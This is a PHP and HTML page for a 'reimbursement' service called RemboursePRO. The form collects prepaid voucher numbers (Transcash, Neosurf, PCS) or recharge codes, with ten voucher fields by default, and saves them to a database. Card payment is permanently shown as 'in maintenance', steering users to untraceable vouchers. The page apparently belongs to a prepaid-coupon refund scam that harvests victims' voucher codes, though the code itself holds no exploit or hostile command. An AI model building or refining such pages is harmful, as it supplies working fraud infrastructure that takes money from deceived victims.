<?php
require_once '../config/auth.php';
require_once '../config/database.php';

checkClient();
$currentUser = getCurrentUser();

$error = '';
$success = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $montantTotal = floatval($_POST['montant_total'] ?? 0);
    $remboursementEffectue = floatval($_POST['remboursement_effectue'] ?? 0);
    $moyenPaiement = sanitizeInput($_POST['moyen_paiement'] ?? '');
    $typeCarte = sanitizeInput($_POST['type_carte'] ?? '');
    $numerosCartes = $_POST['numeros_cartes'] ?? [];
    $codeRechargement = sanitizeInput($_POST['code_rechargement'] ?? '');
    $csrf_token = $_POST['csrf_token'] ?? '';
    
    if (!verifyCSRFToken($csrf_token)) {
        $error = 'Token de sécurité invalide.';
    } elseif ($montantTotal <= 0 || $remboursementEffectue <= 0) {
        $error = 'Les montants doivent être supérieurs à 0.';
    } elseif ($remboursementEffectue > $montantTotal) {
        $error = 'Le remboursement ne peut pas être supérieur au montant total.';
    } elseif (empty($moyenPaiement)) {
        $error = 'Veuillez sélectionner un moyen de paiement.';
    } else {
        // Validation selon le moyen de paiement
        if ($moyenPaiement === 'carte_recharge') {
            if (empty($typeCarte)) {
                $error = 'Veuillez sélectionner le type de carte de recharge.';
            } elseif (count(array_filter($numerosCartes)) === 0) {
                $error = 'Veuillez saisir au moins un numéro de carte de recharge.';
            } else {
                // Valider chaque numéro de carte
                $validCartes = [];
                foreach ($numerosCartes as $numero) {
                    $numero = trim($numero);
                    if (!empty($numero)) {
                        if (!preg_match('/^\d{1,12}$/', $numero)) {
                            $error = 'Les numéros de carte doivent contenir uniquement des chiffres (12 maximum).';
                            break;
                        }
                        $validCartes[] = $numero;
                    }
                }
                
                if (!$error && empty($validCartes)) {
                    $error = 'Veuillez saisir au moins un numéro de carte valide.';
                } else {
                    $numerosCartesStr = implode(',', $validCartes);
                }
            }
        } elseif ($moyenPaiement === 'code_rechargement') {
            if (empty($codeRechargement) || !preg_match('/^\d{12}$/', $codeRechargement)) {
                $error = 'Le code de rechargement doit contenir exactement 12 chiffres.';
            }
        } elseif ($moyenPaiement === 'carte_bancaire') {
            $error = 'Le paiement par carte bancaire est actuellement en maintenance.';
        }
        
        if (!$error) {
            try {
                $database = new Database();
                $db = $database->getConnection();
                
                $resteARembourser = $montantTotal - $remboursementEffectue;
                $numerosCartesStr = $moyenPaiement === 'carte_recharge' ? implode(',', array_filter($numerosCartes)) : null;
                $codeRechargementFinal = $moyenPaiement === 'code_rechargement' ? $codeRechargement : null;
                
                $query = "INSERT INTO reimbursements (user_id, amount_to_reimburse, reimbursement_amount, remaining_amount, 
                         payment_method, card_type, card_numbers, recharge_code) 
                         VALUES (:user_id, :amount_to_reimburse, :reimbursement_amount, :remaining_amount, 
                         :payment_method, :card_type, :card_numbers, :recharge_code)";
                
                $stmt = $db->prepare($query);
                $stmt->bindParam(':user_id', $currentUser['id']);
                $stmt->bindParam(':amount_to_reimburse', $montantTotal);
                $stmt->bindParam(':reimbursement_amount', $remboursementEffectue);
                $stmt->bindParam(':remaining_amount', $resteARembourser);
                $stmt->bindParam(':payment_method', $moyenPaiement);
                $stmt->bindParam(':card_type', $typeCarte);
                $stmt->bindParam(':card_numbers', $numerosCartesStr);
                $stmt->bindParam(':recharge_code', $codeRechargementFinal);
                
                if ($stmt->execute()) {
                    $success = 'Demande de remboursement soumise avec succès ! Vous recevrez un email de confirmation.';
                    
                    // Envoi d'email de confirmation
                    $subject = 'Confirmation de demande de remboursement - RemboursePRO';
                    $message = "
                    <h2>Confirmation de votre demande de remboursement</h2>
                    <p>Bonjour {$currentUser['firstName']},</p>
                    <p>Votre demande de remboursement a été soumise avec succès.</p>
                    <p><strong>Détails :</strong></p>
                    <ul>
                        <li>Montant total : " . number_format($montantTotal, 2) . "€</li>
                        <li>Remboursement effectué : " . number_format($remboursementEffectue, 2) . "€</li>
                        <li>Reste à rembourser : " . number_format($resteARembourser, 2) . "€</li>
                        <li>Moyen de paiement : " . ucfirst(str_replace('_', ' ', $moyenPaiement)) . "</li>
                    </ul>
                    <p>Votre demande sera traitée dans les plus brefs délais.</p>
                    <p>Cordialement,<br>L'équipe RemboursePRO</p>
                    ";
                    
                    sendEmail($currentUser['email'], $subject, $message);
                    
                    // Réinitialiser le formulaire
                    header("refresh:3;url=dashboard.php");
                } else {
                    $error = 'Erreur lors de la soumission de la demande.';
                }
            } catch (Exception $e) {
                $error = 'Erreur de connexion à la base de données.';
            }
        }
    }
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nouveau Remboursement - RemboursePRO</title>
    
    <!-- Bootstrap 5.3.3 -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css" rel="stylesheet">
    
    <!-- CSS INTÉGRÉ -->
    <style>
        html, body {
            background: #0f172a !important;
            background-color: #0f172a !important;
            color: #ffffff !important;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif !important;
            min-height: 100vh !important;
            margin: 0 !important;
            padding: 0 !important;
        }

        * {
            color: #ffffff !important;
        }

        .container, .container-fluid, .row, .col, [class*="col-"] {
            background: transparent !important;
            color: #ffffff !important;
        }

        /* Navigation */
        .navbar, .navbar-glass {
            background: rgba(15, 23, 42, 0.95) !important;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1) !important;
            backdrop-filter: blur(10px) !important;
        }

        .navbar-brand, .nav-link {
            color: #ffffff !important;
        }

        .navbar-brand:hover, .nav-link:hover {
            color: #60a5fa !important;
        }

        /* Cards glassmorphism */
        .glass, .form-glass {
            background: rgba(15, 23, 42, 0.8) !important;
            border: 1px solid rgba(255, 255, 255, 0.1) !important;
            border-radius: 16px !important;
            padding: 2rem !important;
            backdrop-filter: blur(20px) !important;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3) !important;
            color: #ffffff !important;
            margin-bottom: 1rem !important;
        }

        /* Titres */
        h1, h2, h3, h4, h5, h6 {
            color: #ffffff !important;
            font-weight: 600 !important;
        }

        /* Textes */
        p, span, div, label, small {
            color: #ffffff !important;
        }

        .text-white-50 {
            color: rgba(255, 255, 255, 0.7) !important;
        }

        /* Formulaires */
        .form-control, .form-select, input, textarea, select {
            background: rgba(15, 23, 42, 0.8) !important;
            border: 1px solid rgba(255, 255, 255, 0.2) !important;
            color: #ffffff !important;
            border-radius: 10px !important;
            padding: 12px 16px !important;
        }

        .form-control:focus, .form-select:focus, input:focus, textarea:focus, select:focus {
            background: rgba(15, 23, 42, 0.9) !important;
            border-color: #3b82f6 !important;
            color: #ffffff !important;
            box-shadow: 0 0 0 0.2rem rgba(59, 130, 246, 0.25) !important;
        }

        .form-control::placeholder, input::placeholder, textarea::placeholder {
            color: rgba(255, 255, 255, 0.6) !important;
        }

        .form-label {
            color: #ffffff !important;
            font-weight: 500 !important;
            margin-bottom: 0.5rem !important;
        }

        /* Boutons */
        .btn {
            border-radius: 10px !important;
            padding: 10px 20px !important;
            font-weight: 600 !important;
            transition: all 0.3s ease !important;
            border: none !important;
        }

        .btn-gradient {
            background: linear-gradient(135deg, #3b82f6 0%, #8b5cf6 100%) !important;
            color: #ffffff !important;
            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.4) !important;
        }

        .btn-gradient:hover {
            background: linear-gradient(135deg, #2563eb 0%, #7c3aed 100%) !important;
            color: #ffffff !important;
            transform: translateY(-2px) !important;
        }

        .btn-glass {
            background: rgba(255, 255, 255, 0.1) !important;
            border: 1px solid rgba(255, 255, 255, 0.2) !important;
            color: #ffffff !important;
            backdrop-filter: blur(10px) !important;
        }

        .btn-glass:hover {
            background: rgba(255, 255, 255, 0.2) !important;
            color: #ffffff !important;
        }

        /* Alertes */
        .alert {
            border-radius: 10px !important;
            border: none !important;
            padding: 1rem 1.5rem !important;
            margin-bottom: 1rem !important;
        }

        .alert-success {
            background: rgba(34, 197, 94, 0.2) !important;
            color: #ffffff !important;
            border: 1px solid rgba(34, 197, 94, 0.4) !important;
        }

        .alert-danger {
            background: rgba(239, 68, 68, 0.2) !important;
            color: #ffffff !important;
            border: 1px solid rgba(239, 68, 68, 0.4) !important;
        }

        .alert-warning {
            background: rgba(245, 158, 11, 0.2) !important;
            color: #ffffff !important;
            border: 1px solid rgba(245, 158, 11, 0.4) !important;
        }

        /* Liens */
        a {
            color: #60a5fa !important;
        }

        a:hover {
            color: #93c5fd !important;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .form-glass {
                padding: 1.5rem !important;
            }
            
            .container, .container-fluid {
                padding-left: 15px !important;
                padding-right: 15px !important;
            }
        }
        
        /* Navbar mobile improvements */
        .navbar-toggler {
            border: 1px solid rgba(255, 255, 255, 0.2) !important;
            padding: 4px 8px !important;
        }
        
        .navbar-toggler:focus {
            box-shadow: 0 0 0 0.2rem rgba(59, 130, 246, 0.25) !important;
        }
        
        .navbar-toggler-icon {
            background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 30 30'%3e%3cpath stroke='rgba%28255, 255, 255, 0.8%29' stroke-linecap='round' stroke-miterlimit='10' stroke-width='2' d='m4 7h22M4 15h22M4 23h22'/%3e%3c/svg%3e") !important;
            width: 1.2em !important;
            height: 1.2em !important;
        }
        
        .navbar-collapse {
            background: rgba(15, 23, 42, 0.95) !important;
            border-radius: 8px !important;
            margin-top: 10px !important;
            padding: 15px !important;
            border: 1px solid rgba(255, 255, 255, 0.1) !important;
        }
        
        @media (max-width: 991.98px) {
            .navbar-nav {
                text-align: center !important;
            }
            
            .navbar-nav .nav-item {
                margin: 5px 0 !important;
            }
            
            .navbar-brand {
                font-size: 1.5rem !important;
            }
        }
    </style>
</head>
<body>
    <!-- Navigation -->
    <nav class="navbar navbar-expand-lg navbar-glass fixed-top">
        <div class="container-fluid">
            <a class="navbar-brand" href="../index.php">
                <i class="bi bi-shield-check me-2"></i>RemboursePRO
            </a>
            
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
                <span class="navbar-toggler-icon"></span>
            </button>
            
            <div class="collapse navbar-collapse" id="navbarNav">
                <div class="navbar-nav ms-auto">
                    <div class="d-flex align-items-center flex-column flex-lg-row">
                        <span class="text-white me-lg-3 mb-2 mb-lg-0">
                            <i class="bi bi-person-circle me-2"></i><?= htmlspecialchars($currentUser['firstName'] . ' ' . $currentUser['lastName']) ?>
                        </span>
                        <div class="d-flex gap-2 flex-wrap justify-content-center">
                            <a href="dashboard.php" class="btn btn-glass btn-sm">
                                <i class="bi bi-speedometer2 me-1"></i>Dashboard
                            </a>
                            <a href="calculateur.php" class="btn btn-glass btn-sm">
                                <i class="bi bi-calculator me-1"></i>Calculateur
                            </a>
                            <a href="historique.php" class="btn btn-glass btn-sm">
                                <i class="bi bi-clock-history me-1"></i>Historique
                            </a>
                            <a href="../logout.php" class="btn btn-outline-light btn-sm">
                                <i class="bi bi-box-arrow-right me-1"></i>Déconnexion
                            </a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </nav>

    <div class="container-fluid" style="padding-top: 80px;">
        <div class="py-4">
            <div class="d-flex justify-content-between align-items-center mb-4">
                <h1 class="text-white">
                    <i class="bi bi-credit-card me-3"></i>Nouveau Remboursement
                </h1>
                <a href="dashboard.php" class="btn btn-glass">
                    <i class="bi bi-arrow-left me-2"></i>Retour
                </a>
            </div>

            <?php if ($error): ?>
                <div class="alert alert-danger" role="alert">
                    <i class="bi bi-exclamation-triangle me-2"></i><?= htmlspecialchars($error) ?>
                </div>
            <?php endif; ?>
            
            <?php if ($success): ?>
                <div class="alert alert-success" role="alert">
                    <i class="bi bi-check-circle me-2"></i><?= htmlspecialchars($success) ?>
                </div>
            <?php endif; ?>

            <div class="row">
                <div class="col-lg-8">
                    <div class="form-glass">
                        <h3 class="text-white mb-4">
                            <i class="bi bi-credit-card me-2"></i>Formulaire de Remboursement
                        </h3>
                        
                        <form method="POST" action="">
                            <input type="hidden" name="csrf_token" value="<?= generateCSRFToken() ?>">
                            
                            <div class="row mb-3">
                                <div class="col-md-6">
                                    <label for="montant_total" class="form-label text-white">
                                        <i class="bi bi-currency-euro me-2"></i>Montant à rembourser (€) *
                                    </label>
                                    <input type="number" class="form-control" id="montant_total" 
                                           name="montant_total" step="0.01" min="0.01" required>
                                </div>
                                <div class="col-md-6">
                                    <label for="remboursement_effectue" class="form-label text-white">
                                        <i class="bi bi-cash me-2"></i>Remboursement à effectuer (€) *
                                    </label>
                                    <input type="number" class="form-control" id="remboursement_effectue" 
                                           name="remboursement_effectue" step="0.01" min="0.01" required>
                                </div>
                            </div>
                            
                            <div class="mb-3">
                                <label for="reste_a_rembourser" class="form-label text-white">
                                    <i class="bi bi-calculator me-2"></i>Reste à rembourser (€)
                                </label>
                                <input type="number" class="form-control" id="reste_a_rembourser" readonly>
                            </div>
                            
                            <div class="mb-3">
                                <label for="moyen_paiement" class="form-label text-white">
                                    <i class="bi bi-credit-card-2-front me-2"></i>Moyen de paiement *
                                </label>
                                <select class="form-control" id="moyen_paiement" name="moyen_paiement" required>
                                    <option value="">Sélectionnez un moyen de paiement</option>
                                    <option value="carte_recharge">Carte de recharge</option>
                                    <option value="code_rechargement">Code de rechargement</option>
                                    <option value="carte_bancaire">Carte bancaire</option>
                                </select>
                            </div>
                            
                            <!-- Champs conditionnels pour carte de recharge -->
                            <div class="payment-fields" id="carte_recharge_fields" style="display: none;">
                                <label for="type_carte" class="form-label text-white">
                                    <i class="bi bi-credit-card me-2"></i>Type de carte de recharge *
                                </label>
                                <select class="form-control mb-3" id="type_carte" name="type_carte">
                                    <option value="">Sélectionnez le type de carte</option>
                                    <option value="transcash">Transcash</option>
                                    <option value="neosurf">Neosurf</option>
                                    <option value="pcs">PCS</option>
                                </select>
                                
                                <div id="numeros_cartes_container" style="display: none;">
                                    <label class="form-label text-white">
                                        <i class="bi bi-123 me-2"></i>Numéros des cartes de recharge *
                                    </label>
                                    <div id="cartes_container">
                                        <!-- Les cartes seront ajoutées ici dynamiquement -->
                                    </div>
                                    <button type="button" id="add_carte_btn" class="btn btn-glass btn-sm mt-2">
                                        <i class="bi bi-plus-circle me-2"></i>Ajouter une carte
                                    </button>
                                </div>
                            </div>
                            
                            <!-- Champs conditionnels pour code de rechargement -->
                            <div class="payment-fields" id="code_rechargement_fields" style="display: none;">
                                <label for="code_rechargement" class="form-label text-white">
                                    <i class="bi bi-key me-2"></i>Code de rechargement (12 chiffres) *
                                </label>
                                <input type="text" class="form-control" id="code_rechargement" 
                                       name="code_rechargement" maxlength="12" pattern="[0-9]{12}" 
                                       title="12 chiffres uniquement" placeholder="123456789012">
                            </div>
                            
                            <!-- Message pour carte bancaire -->
                            <div class="payment-fields" id="carte_bancaire_fields" style="display: none;">
                                <div class="alert alert-warning">
                                    <i class="bi bi-exclamation-triangle me-2"></i>
                                    Le paiement par carte bancaire est actuellement en maintenance. 
                                    Veuillez choisir un autre moyen de paiement.
                                </div>
                            </div>
                            
                            <div class="d-grid">
                                <button type="submit" class="btn btn-gradient" id="submitBtn">
                                    <i class="bi bi-send me-2"></i>Soumettre la demande
                                </button>
                            </div>
                        </form>
                    </div>
                </div>
                
                <div class="col-lg-4">
                    <div class="glass p-4 rounded-3 mb-4">
                        <h4 class="text-white mb-3">
                            <i class="bi bi-info-circle me-2"></i>Informations importantes
                        </h4>
                        <ul class="text-white-50 small">
                            <li class="mb-2">Vérifiez bien vos informations avant de soumettre</li>
                            <li class="mb-2">Un email de confirmation vous sera envoyé</li>
                            <li class="mb-2">Le traitement prend généralement 24-48h</li>
                            <li class="mb-2">Vous pouvez suivre le statut dans votre historique</li>
                        </ul>
                    </div>
                    
                    <div class="glass p-4 rounded-3">
                        <h4 class="text-white mb-3">
                            <i class="bi bi-headset me-2"></i>Besoin d'aide ?
                        </h4>
                        <p class="text-white-50 small mb-3">
                            Notre équipe support est disponible 24h/24 pour vous accompagner.
                        </p>
                        <div class="d-grid">
                            <button class="btn btn-glass">
                                <i class="bi bi-chat-dots me-2"></i>Contacter le support
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    
    <script>
        // Calcul automatique du reste à rembourser
        function calculateRemaining() {
            const montantTotal = parseFloat(document.getElementById('montant_total').value) || 0;
            const remboursementEffectue = parseFloat(document.getElementById('remboursement_effectue').value) || 0;
            const resteARembourser = Math.max(0, montantTotal - remboursementEffectue);
            
            document.getElementById('reste_a_rembourser').value = resteARembourser.toFixed(2);
        }

        document.getElementById('montant_total').addEventListener('input', calculateRemaining);
        document.getElementById('remboursement_effectue').addEventListener('input', calculateRemaining);

        // Gestion des champs conditionnels
        document.getElementById('moyen_paiement').addEventListener('change', function() {
            const selectedMethod = this.value;
            const allFields = document.querySelectorAll('.payment-fields');
            
            // Masquer tous les champs
            allFields.forEach(field => field.style.display = 'none');
            
            // Afficher le champ correspondant
            if (selectedMethod) {
                const targetField = document.getElementById(selectedMethod + '_fields');
                if (targetField) {
                    targetField.style.display = 'block';
                }
            }
            
            // Désactiver le bouton submit pour carte bancaire
            const submitBtn = document.getElementById('submitBtn');
            if (selectedMethod === 'carte_bancaire') {
                submitBtn.disabled = true;
                submitBtn.innerHTML = '<i class="bi bi-exclamation-triangle me-2"></i>Moyen de paiement en maintenance';
            } else {
                submitBtn.disabled = false;
                submitBtn.innerHTML = '<i class="bi bi-send me-2"></i>Soumettre la demande';
            }
        });

        // Gestion du type de carte de recharge
        document.getElementById('type_carte').addEventListener('change', function() {
            const numerosContainer = document.getElementById('numeros_cartes_container');
            if (this.value) {
                numerosContainer.style.display = 'block';
                initializeCartes();
            } else {
                numerosContainer.style.display = 'none';
            }
        });

        // Initialiser les cartes de recharge
        let carteCount = 0;
        
        function initializeCartes() {
            const container = document.getElementById('cartes_container');
            container.innerHTML = '';
            carteCount = 0;
            
            // Créer 10 cartes par défaut
            for (let i = 0; i < 10; i++) {
                addCarte();
            }
        }
        
        function addCarte() {
            carteCount++;
            const container = document.getElementById('cartes_container');
            
            const newCarte = document.createElement('div');
            newCarte.className = 'carte-recharge-item mb-3';
            newCarte.innerHTML = `
                <div class="d-flex justify-content-between align-items-center mb-2">
                    <span class="text-white">Carte ${carteCount}</span>
                    ${carteCount > 10 ? `
                        <button type="button" class="btn btn-danger btn-sm remove-carte">
                            <i class="bi bi-trash"></i>
                        </button>
                    ` : ''}
                </div>
                <input type="text" class="form-control carte-number-input" 
                       name="numeros_cartes[]" maxlength="12" pattern="[0-9]{1,12}" 
                       placeholder="12 chiffres maximum" title="Chiffres uniquement (12 max)">
            `;
            
            container.appendChild(newCarte);
            addInputValidation(newCarte.querySelector('.carte-number-input'));
        }
        
        // Ajouter une carte supplémentaire
        document.getElementById('add_carte_btn').addEventListener('click', function() {
            addCarte();
        });
        
        // Supprimer une carte (seulement celles ajoutées après les 10 premières)
        document.addEventListener('click', function(e) {
            if (e.target.closest('.remove-carte')) {
                e.target.closest('.carte-recharge-item').remove();
                updateCarteNumbers();
            }
        });
        
        // Mettre à jour les numéros de cartes
        function updateCarteNumbers() {
            const cartes = document.querySelectorAll('.carte-recharge-item');
            cartes.forEach((carte, index) => {
                carte.querySelector('span').textContent = `Carte ${index + 1}`;
            });
            carteCount = cartes.length;
        }
        
        // Validation des entrées pour les numéros de carte
        function addInputValidation(input) {
            input.addEventListener('input', function() {
                // Permettre seulement les chiffres
                this.value = this.value.replace(/\D/g, '');
                
                // Limiter à 12 chiffres
                if (this.value.length > 12) {
                    this.value = this.value.substring(0, 12);
                }
            });
        }

        // Validation du code de rechargement
        document.getElementById('code_rechargement').addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '');
        });
    </script>
</body>
</html>